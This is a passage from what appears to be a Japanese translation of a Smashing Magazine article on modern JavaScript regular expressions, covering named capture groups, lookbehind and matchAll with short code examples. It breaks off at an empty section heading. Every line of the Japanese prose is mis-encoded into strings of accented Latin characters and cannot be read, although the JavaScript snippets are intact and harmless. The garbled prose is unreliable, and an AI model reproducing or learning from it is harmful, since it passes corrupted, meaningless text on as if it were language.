<p>ã“ã‚Œã‚‰ã®å¤‰æ›´ãŒå®Ÿè£…ã•ã‚ŒãŸä»Šã€JavaScriptã®æ­£è¦è¡¨ç¾ã¯ä»–ã®æ­£è¦è¡¨ç¾ã¨æ¯”ã¹ã¦ã©ã†ãªã®ã§ã—ã‚‡ã†ã‹ã€‚è€ƒãˆæ–¹ã¯è‰²ã€…ã‚ã‚Šã¾ã™ãŒã€ä¸»ãªè¦ç´ ã‚’ä»¥ä¸‹ã«æŒ™ã’ã¾ã™ã€‚</p>
<ul>
<li>
<p><strong>ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹</strong><br>
ã“ã‚Œã¯é‡è¦ãªè¦ç´ ã§ã¯ã‚ã‚Šã¾ã™ãŒã€æˆç†Ÿã—ãŸæ­£è¦è¡¨ç¾ã®å®Ÿè£…ã¯æ¦‚ã­ã‹ãªã‚Šé€Ÿã„ã®ã§ã€æœ€ã‚‚é‡è¦ã§ã¯ãªã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚JavaScriptã¯æ­£è¦è¡¨ç¾ã®ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã¯å¼·åŠ›ã§ã™ãŒï¼ˆå°‘ãªãã¨ã‚‚ã€Node.jsã€Chromiumãƒ™ãƒ¼ã‚¹ã®ãƒ–ãƒ©ã‚¦ã‚¶ã€<a href="https://hacks.mozilla.org/2020/06/a-new-regexp-engine-in-spidermonkey/">ã•ã‚‰ã«ã¯Firefox</a>ã§æ¡ç”¨ã•ã‚Œã¦ã„ã‚‹V8ã®Irregexpã‚¨ãƒ³ã‚¸ãƒ³ã‚„ã€Safariã§ä½¿ã‚ã‚Œã¦ã„ã‚‹JavaScriptCoreã§ã¯å„ªã‚Œã¦ã„ã¾ã™ï¼‰ã€ãƒãƒƒã‚¯ãƒˆãƒ©ãƒƒã‚­ãƒ³ã‚°ã‚’åˆ¶å¾¡ã™ã‚‹æ§‹æ–‡ã‚’ä¸€åˆ‡æŒãŸãªã„ãƒãƒƒã‚¯ãƒˆãƒ©ãƒƒã‚­ãƒ³ã‚°ã‚¨ãƒ³ã‚¸ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ç‚¹ãŒå¤§ããªåˆ¶ç´„ã§ã‚ã‚Šã€ReDoSã®è„†å¼±æ€§ãŒåºƒãŒã‚‹è¦å› ã«ãªã£ã¦ã„ã¾ã™ã€‚</p>
</li>
<li>
<p><strong>ä¸€èˆ¬çš„ã¾ãŸã¯é‡è¦ãªãƒ¦ãƒ¼ã‚¹ã‚±ãƒ¼ã‚¹ã‚’æ‰±ã†å…ˆé€²æ©Ÿèƒ½ã¸ã®å¯¾å¿œ</strong><br>
JavaScriptã¯ES2018ã¨ES2024ã§å…ˆé€²æ©Ÿèƒ½ã¸ã®å¯¾å¿œãŒå¤§ããé€²ã¿ã¾ã—ãŸã€‚å¾Œèª­ã¿ï¼ˆç„¡é™ã®é•·ã•ã«å¯¾å¿œï¼‰ã‚„Unicodeãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ï¼ˆè¤‡æ•°æ–‡å­—ã«ã‚ˆã‚‹ã€Œæ–‡å­—åˆ—ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã€ã€å·®é›†åˆã€ç©é›†åˆã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆæ‹¡å¼µæ©Ÿèƒ½ã«å¯¾å¿œï¼‰ãªã©ä¸€éƒ¨ã®æ©Ÿèƒ½ã«ãŠã„ã¦ã€JavaScriptã¯ä»Šã‚„ã‚¯ãƒ©ã‚¹æœ€é«˜ãƒ¬ãƒ™ãƒ«ã§ã™ã€‚ã“ã‚Œã‚‰ã®æ©Ÿèƒ½ã¯ã€ä»–ã®å¤šãã®æ­£è¦è¡¨ç¾ã§ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ãªã„ã‹ã€å …ç‰¢æ€§ãŒåŠ£ã‚Šã¾ã™ã€‚</p>
</li>
<li>
<p><strong>èª­ã¿ã‚„ã™ãä¿å®ˆæ€§ã«å„ªã‚ŒãŸãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’æ›¸ã‘ã‚‹</strong><br>
ãƒã‚¤ãƒ†ã‚£ãƒ–ã®JavaScriptã¯ã€ã“ã®ç‚¹ã§é•·å¹´ä¸»è¦ãªè¨€èªã®ä¸­ã§æœ€ä½ã®è©•ä¾¡ã‚’å—ã‘ã¦ãã¾ã—ãŸã€‚ãã®ç†ç”±ã¯ã€ã¡ã‚‡ã£ã¨ã—ãŸç©ºç™½ã‚„ã‚³ãƒ¡ãƒ³ãƒˆã‚’å…¥åŠ›ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹<code class="language-text">x</code>ï¼ˆæ‹¡å¼µï¼‰ãƒ•ãƒ©ã‚°ãŒæ¬ ã‘ã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚æ­£è¦è¡¨ç¾ã®ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³ã¨ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³å®šç¾©ã‚°ãƒ«ãƒ¼ãƒ—ï¼ˆPCREã¨Perlã®æ©Ÿèƒ½ï¼‰ã¯ã€æ–‡æ³•çš„ã«æ­£ã—ã„æ­£è¦è¡¨ç¾ã‚’æ›¸ãã€åˆæˆã«ã‚ˆã‚Šè¤‡é›‘ãªãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’æ§‹ç¯‰ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹å¼·åŠ›ãªæ©Ÿèƒ½ã§ã™ãŒã€ã“ã‚Œã‚‰ã‚‚ã‚ã‚Šã¾ã›ã‚“ã€‚</p>
</li>
</ul>
<p>ã¤ã¾ã‚Šã€è‰¯ã„é¢ã‚‚æ‚ªã„é¢ã‚‚ã‚ã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚</p>
<blockquote class=pull-quote><p><a class=pull-quote__link aria-label="Share on Twitter" href="https://twitter.com/share?text=%0aJavaScript%20regexes%20have%20become%20exceptionally%20powerful,%20but%20they%e2%80%99re%20still%20missing%20key%20features%20that%20could%20make%20regexes%20safer,%20more%20readable,%20and%20more%20maintainable%20%28all%20of%20which%20hold%20some%20people%20back%20from%20using%20this%20power%29.%0a&url=https://smashingmagazine.com%2f2024%2f08%2fhistory-future-regular-expressions-javascript%2f">JavaScriptã®æ­£è¦è¡¨ç¾ã¯æ¥µã‚ã¦å¼·åŠ›ã«ãªã‚Šã¾ã—ãŸãŒã€æ­£è¦è¡¨ç¾ã‚’ã‚ˆã‚Šå®‰å…¨ã§ã€èª­ã¿ã‚„ã™ãã€ä¿å®ˆã—ã‚„ã™ãã§ãã‚‹é‡è¦ãªæ©Ÿèƒ½ãŒã¾ã æ¬ ã‘ã¦ã„ã¾ã™ï¼ˆã“ã‚Œã¯ã€ãã®åŠ›ã‚’åˆ©ç”¨ã™ã‚‹ã®ã‚’ãŸã‚ã‚‰ã†ç†ç”±ã«ã‚‚ãªã£ã¦ã„ã¾ã™ï¼‰</a></p></blockquote>
<p>ï¼ˆè¨³æ³¨ï¼šåŸæ–‡åŒæ§˜ Xã¸ã®POSTãƒªãƒ³ã‚¯ã¨ãªã£ã¦ã„ã¾ã™ï¼‰</p>
<p>å¹¸ã„ã€ã“ã‚Œã‚‰ã®ç©´ã¯ã™ã¹ã¦JavaScriptãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«ã‚ˆã£ã¦åŸ‹ã‚ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã‚Œã«ã¤ã„ã¦ã¯å¾Œã»ã©èª¬æ˜ã—ã¾ã™ã€‚</p>
<h2>JavaScriptã®ãƒ¢ãƒ€ãƒ³ãªæ­£è¦è¡¨ç¾æ©Ÿèƒ½ã‚’ä½¿ç”¨ã™ã‚‹ <a href="#JavaScriptã®ãƒ¢ãƒ€ãƒ³ãªæ­£è¦è¡¨ç¾æ©Ÿèƒ½ã‚’ä½¿ç”¨ã™ã‚‹">#</a><a name="JavaScriptã®ãƒ¢ãƒ€ãƒ³ãªæ­£è¦è¡¨ç¾æ©Ÿèƒ½ã‚’ä½¿ç”¨ã™ã‚‹"></a></h2>
<p>çš†ã•ã‚“ãŒã‚ã¾ã‚ŠçŸ¥ã‚‰ãªã„ã‹ã‚‚ã—ã‚Œãªã„ã€ã‚‚ã£ã¨ä¾¿åˆ©ãªãƒ¢ãƒ€ãƒ³æ­£è¦è¡¨ç¾æ©Ÿèƒ½ã‚’ã„ãã¤ã‹ã”ç´¹ä»‹ã—ã¾ã™ã€‚å…ˆã«è¨€ã£ã¦ãŠãã¾ã™ãŒã€<strong>ã“ã‚Œã¯ã‚„ã‚„ä¸Šç´šè€…å‘ã‘ã®ã‚¬ã‚¤ãƒ‰ã§ã™</strong>ã€‚æ­£è¦è¡¨ç¾ã‚’ä½¿ã„å§‹ã‚ã¦ã¾ã æ—¥ãŒæµ…ã„æ–¹ã¯ã€æ‰‹å§‹ã‚ã«ä»¥ä¸‹ã®ç´ æ™´ã‚‰ã—ã„ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’ã”è¦§ã„ãŸã ãã¨ã„ã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚</p>
<ul>
<li><a href="https://regexlearn.com/">RegexLearn</a>ã¨<a href="https://regexone.com/">RegexOne</a>ã¯ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–ãªãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã§ã€ç·´ç¿’å•é¡Œã‚‚ã‚ã‚Šã¾ã™ã€‚</li>
<li>JavaScript.infoã®<a href="https://javascript.info/regular-expressions">æ­£è¦è¡¨ç¾ã®ç« </a>ã¯ã€JavaScriptã«ç‰¹åŒ–ã—ãŸè©³ç´°ãªã‚¬ã‚¤ãƒ‰ã§ã™ã€‚</li>
<li><a href="https://www.youtube.com/watch?v=M7vDtxaD7ZU">Demystifying Regular Expressions</a>ï¼ˆå‹•ç”»ï¼‰ã¯ã€Lea Verouæ°ãŒHolyJS 2017ã§è¡Œã£ãŸã€åˆå¿ƒè€…å‘ã‘ã®ç´ æ™´ã‚‰ã—ã„è¬›æ¼”ã§ã™ã€‚</li>
<li><a href="https://www.youtube.com/watch?v=rhzKDrUiJVk">Learn Regular Expressions In 20 Minutes</a>ã¯ã€å®Ÿéš›ã«æ­£è¦è¡¨ç¾ãƒ†ã‚¹ã‚¿ãƒ¼ã‚’å‹•ã‹ã—ãªãŒã‚‰æ§‹æ–‡ã‚’èª¬æ˜ã™ã‚‹å‹•ç”»ã§ã™ã€‚</li>
</ul>
<h2>åå‰ä»˜ãã‚­ãƒ£ãƒ—ãƒãƒ£ <a href="#åå‰ä»˜ãã‚­ãƒ£ãƒ—ãƒãƒ£">#</a><a name="åå‰ä»˜ãã‚­ãƒ£ãƒ—ãƒãƒ£"></a></h2>
<p>æ­£è¦è¡¨ç¾ãŒä¸€è‡´ã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã ã‘ã§ãªãã€ä¸€è‡´ã™ã‚‹æ–‡å­—åˆ—ã‹ã‚‰ã‚µãƒ–æ–‡å­—åˆ—ã‚’æŠ½å‡ºã—ã€ã‚³ãƒ¼ãƒ‰ä¸Šã§ä½•ã‚‰ã‹ã®æ“ä½œã‚’è¡Œã„ãŸã„å ´åˆã‚‚å¤šã„ã§ã—ã‚‡ã†ã€‚åå‰ä»˜ãã‚­ãƒ£ãƒ—ãƒãƒ£ã‚°ãƒ«ãƒ¼ãƒ—ã‚’ä½¿ã†ã“ã¨ã§ã€æ­£è¦è¡¨ç¾ã¨ã‚³ãƒ¼ãƒ‰ãŒ<strong>ã‚ˆã‚Šèª­ã¿ã‚„ã™ã</strong>ãªã‚Šã€<strong>è‡ªå·±æ–‡æ›¸åŒ–</strong>ã™ã‚‹ã‚ˆã†ãªæ–¹æ³•ã§ãã‚Œã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<p>ä»¥ä¸‹ã®ä¾‹ã§ã¯ã€2ã¤ã®æ—¥ä»˜ã‚’æŒã¤ãƒ¬ã‚³ãƒ¼ãƒ‰ã‚’ãƒãƒƒãƒãƒ³ã‚°ã•ã›ã€å€¤ã‚’å–å¾—ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> record <span class="token operator">=</span> <span class="token string">'Admitted: 2024-01-01\nReleased: 2024-01-03'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^Admitted: (?&lt;admitted>\d{4}-\d{2}-\d{2})\nReleased: (?&lt;released>\d{4}-\d{2}-\d{2})$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>
<span class="token keyword">const</span> match <span class="token operator">=</span> record<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>match<span class="token punctuation">.</span>groups<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/* â†’ {
  admitted: '2024-01-01',
  released: '2024-01-03'
} */</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã®æ­£è¦è¡¨ç¾ã‚’ç†è§£ã§ããªãã¦ã‚‚å¤§ä¸ˆå¤«ã§ã™ã€‚ã“ã‚Œã‚’ã‚‚ã£ã¨èª­ã¿ã‚„ã™ãã™ã‚‹æ–¹æ³•ã‚’å¾Œã§èª¬æ˜ã—ã¾ã™ã€‚ã“ã“ã§é‡è¦ãªã®ã¯ã€åå‰ä»˜ãã‚­ãƒ£ãƒ—ãƒãƒ£ã‚°ãƒ«ãƒ¼ãƒ—ãŒ<code class="language-text">(?&lt;name>...)</code>æ§‹æ–‡ã‚’ä½¿ç”¨ã—ã€ãƒãƒƒãƒã—ãŸæ–‡å­—åˆ—ã®<code class="language-text">groups</code>ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆä¸Šã«ãã®çµæœãŒæ ¼ç´ã•ã‚Œã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚</p>
<p>ã¾ãŸã€åå‰ä»˜ãå¾Œæ–¹å‚ç…§ã‚’ä½¿ç”¨ã—ã¦ã€åå‰ä»˜ãã‚­ãƒ£ãƒ—ãƒãƒ£ã‚°ãƒ«ãƒ¼ãƒ—ãŒ<code class="language-text">\k&lt;name></code>ã«ã‚ˆã‚Šãƒãƒƒãƒãƒ³ã‚°ã—ãŸæ–‡å­—åˆ—ã‚’å†åº¦ãƒãƒƒãƒãƒ³ã‚°ã™ã‚‹ã“ã¨ã‚‚ã§ãã€æ¤œç´¢ã‚„ç½®æ›ã®ä¸­ã§ãã‚Œã‚‰ã®å€¤ã‚’ä»¥ä¸‹ã®ã‚ˆã†ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Change 'FirstName LastName' to 'LastName, FirstName'</span>
<span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token string">'Shaquille Oatmeal'</span><span class="token punctuation">;</span>
name<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;first>\w+) (?&lt;last>\w+)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token string">'$&lt;last>, $&lt;first>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// â†’ 'Oatmeal, Shaquille'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>ç½®æ›ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯é–¢æ•°å†…ã§åå‰ä»˜ãå¾Œæ–¹å‚ç…§ã‚’ä½¿ç”¨ã—ãŸã„ä¸Šç´šè€…ã¯ã€æœ€å¾Œã®å¼•æ•°ã¨ã—ã¦<code class="language-text">groups</code>ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’æŒ‡å®šã—ã¾ã™ã€‚ä»¥ä¸‹ã«ä¾‹ã‚’æŒ™ã’ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fahrenheitToCelsius</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;degrees>-?\d+(\.\d+)?)F\b</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>re<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> groups <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">round</span><span class="token punctuation">(</span><span class="token punctuation">(</span>groups<span class="token punctuation">.</span>degrees <span class="token operator">-</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token operator">/</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'C'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">fahrenheitToCelsius</span><span class="token punctuation">(</span><span class="token string">'98.6F'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// â†’ '37C'</span>
<span class="token function">fahrenheitToCelsius</span><span class="token punctuation">(</span><span class="token string">'May 9 high is 40F and low is 21F'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// â†’ 'May 9 high is 4C and low is -6C'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>å¾Œèª­ã¿ <a href="#å¾Œèª­ã¿">#</a><a name="å¾Œèª­ã¿"></a></h2>
<p>å¾Œèª­ã¿ï¼ˆES2018ã§å°å…¥ï¼‰ã¯ã€JavaScriptã®æ­£è¦è¡¨ç¾ã§ä»¥å‰ã‹ã‚‰ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ãŸå…ˆèª­ã¿ã‚’è£œå®Œã™ã‚‹æ©Ÿèƒ½ã§ã™ã€‚å…ˆèª­ã¿ã¨å¾Œèª­ã¿ã¯ã‚¢ã‚µãƒ¼ã‚·ãƒ§ãƒ³ï¼ˆæ–‡å­—åˆ—ã®å§‹ã¾ã‚Šã‚’ç¤ºã™<code class="language-text">^</code>ã‚„ã€å˜èªã®å¢ƒç•Œã‚’ç¤ºã™<code class="language-text">\b</code>ã¨ä¼¼ã¦ã„ã¾ã™ï¼‰ã§ã‚ã‚Šã€ãƒãƒƒãƒã®éç¨‹ã§æ–‡å­—ã‚’ä¸€åˆ‡æ¶ˆè²»ã—ã¾ã›ã‚“ã€‚å¾Œèª­ã¿ã¯ã€ã‚µãƒ–ãƒ‘ã‚¿ãƒ¼ãƒ³ãŒç¾åœ¨ã®ãƒãƒƒãƒä½ç½®ã®ç›´å‰ã«è¦‹ã¤ã‹ã‚‹ã‹ã©ã†ã‹ã§æˆå¦ãŒæ±ºã¾ã‚Šã¾ã™ã€‚</p>
<p>ä¾‹ãˆã°ã€ä»¥ä¸‹ã®æ­£è¦è¡¨ç¾ã¯å¾Œèª­ã¿<code class="language-text">(?&lt;=...)</code>ã‚’ä½¿ç”¨ã—ã¦ã€ã€Œfatã€ã®å¾Œã«ç¶šãã€Œcatã€ã¨ã„ã†å˜èªï¼ˆã€Œcatã€ã¨ã„ã†å˜èªã®ã¿ï¼‰ã‚’ãƒãƒƒãƒãƒ³ã‚°ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;=fat )cat</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
<span class="token string">'cat, fat cat, brat cat'</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>re<span class="token punctuation">,</span> <span class="token string">'pigeon'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// â†’ 'cat, fat pigeon, brat cat'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>ã¾ãŸã€å¦å®šå¾Œèª­ã¿<code class="language-text">(?&lt;!...)</code>ã‚’ä½¿ç”¨ã—ã¦ã‚¢ã‚µãƒ¼ã‚·ãƒ§ãƒ³ã‚’åè»¢ã•ã›ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ãã†ã™ã‚‹ã“ã¨ã§ã€æ­£è¦è¡¨ç¾ã¯å‰ã«ã€Œfatã€ãŒä»˜ã‹ãªã„ã™ã¹ã¦ã®ã€Œcatã€ã‚’ãƒãƒƒãƒãƒ³ã‚°ã™ã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;!fat )cat</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
<span class="token string">'cat, fat cat, brat cat'</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>re<span class="token punctuation">,</span> <span class="token string">'pigeon'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// â†’ 'pigeon, fat cat, brat pigeon'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>å¾Œèª­ã¿ã®å®Ÿè£…ã¯JavaScriptã®ã‚‚ã®ãŒæœ€ã‚‚å„ªã‚Œã¦ã„ã¾ã™ï¼ˆåŒ¹æ•µã™ã‚‹ã®ã¯.NETã ã‘ã§ã™ï¼‰ã€‚ä»–ã®æ­£è¦è¡¨ç¾ã¯å¾Œèª­ã¿ã®ä¸­ã«å¯å¤‰é•·ãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’èªã‚ã‚‹ã‹ã©ã†ã‹ã€ã„ã¤èªã‚ã‚‹ã‹ã«ã¤ã„ã¦ä¸€è²«æ€§ã®ãªã„è¤‡é›‘ãªè¦å‰‡ã‚’è¨­ã‘ã¦ã„ã¾ã™ãŒã€JavaScriptã¯ã‚ã‚‰ã‚†ã‚‹ã‚µãƒ–ãƒ‘ã‚¿ãƒ¼ãƒ³ã«ã¤ã„ã¦å¾Œèª­ã¿ã‚’èªã‚ã¦ã„ã¾ã™ã€‚</p>
<h2><code class="language-text">matchAll</code>ãƒ¡ã‚½ãƒƒãƒ‰ <a href="#matchAllãƒ¡ã‚½ãƒƒãƒ‰">#</a><a name="matchAllãƒ¡ã‚½ãƒƒãƒ‰"></a></h2>
<p>ES2020ã§ã¯JavaScriptã®<code class="language-text">String.prototype.matchAll</code>ãŒè¿½åŠ ã•ã‚Œã€è©³ç´°ãªãƒãƒƒãƒæƒ…å ±ãŒå¿…è¦ãªå ´åˆã«æ­£è¦è¡¨ç¾ãƒãƒƒãƒã‚’ãƒ«ãƒ¼ãƒ—ã§å®Ÿè¡Œã—ã‚„ã™ããªã‚Šã¾ã—ãŸã€‚ä»¥å‰ã¯ä»–ã®æ–¹æ³•ã‚‚åˆ©ç”¨ã§ãã¾ã—ãŸãŒã€<code class="language-text">matchAll</code>ã®æ–¹ãŒå®¹æ˜“ãªå ´åˆãŒå¤šãã€é•·ã•ã‚¼ãƒ­ã®ãƒãƒƒãƒã‚’è¿”ã™å¯èƒ½æ€§ãŒã‚ã‚‹æ­£è¦è¡¨ç¾ã®çµæœã«å¯¾ã—ã¦ãƒ«ãƒ¼ãƒ—å®Ÿè¡Œã™ã‚‹éš›ã«ç„¡é™ãƒ«ãƒ¼ãƒ—ã«é™¥ã‚‰ãªã„ã‚ˆã†ã«ã™ã‚‹ãªã©ã€è½ã¨ã—ç©´ã‚‚å›é¿ã—ã¾ã™ã€‚</p>
<p><code class="language-text">matchAll</code>ã¯ã‚¤ãƒ†ãƒ¬ãƒ¼ã‚¿ï¼ˆé…åˆ—ã§ã¯ãªãï¼‰ã‚’è¿”ã™ãŸã‚ã€<code class="language-text">for...of</code>ãƒ«ãƒ¼ãƒ—ã«ãŠã„ã¦ä½¿ã„ã‚„ã™ã„ã¨ã„ã†åˆ©ç‚¹ãŒã‚ã‚Šã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;char1>\w)(?&lt;char2>\w)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> match <span class="token keyword">of</span> str<span class="token punctuation">.</span><span class="token function">matchAll</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span>char1<span class="token punctuation">,</span> char2<span class="token punctuation">}</span> <span class="token operator">=</span> match<span class="token punctuation">.</span>groups<span class="token punctuation">;</span>
  <span class="token comment">// Print each complete match and matched subpatterns</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Matched "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>match<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">" with "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>char1<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">" and "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>char2<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><strong>æ³¨</strong>ï¼šæ­£è¦è¡¨ç¾ã§<code class="language-text">matchAll</code>ã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã€<code class="language-text">g</code>ãƒ•ãƒ©ã‚°ï¼ˆ<code class="language-text">global</code>ï¼‰ãŒå¿…é ˆã¨ãªã‚Šã¾ã™ã€‚ã¾ãŸã€ä»–ã®ã‚¤ãƒ†ãƒ¬ãƒ¼ã‚¿ã¨åŒæ§˜ã«<code class="language-text">Array.from</code>ã¾ãŸã¯é…åˆ—ã‚¹ãƒ—ãƒ¬ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã™ã¹ã¦ã®çµæœã‚’é…åˆ—ã¨ã—ã¦å—ã‘å–ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> matches <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>str<span class="token punctuation">.</span><span class="token function">matchAll</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">.</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<h2>Unicodeãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ <a href="#Unicodeãƒ—ãƒ­ãƒ‘ãƒ†ã‚£">#</a><a name="Unicodeãƒ—ãƒ­ãƒ‘ãƒ†ã‚£"></a></h2>
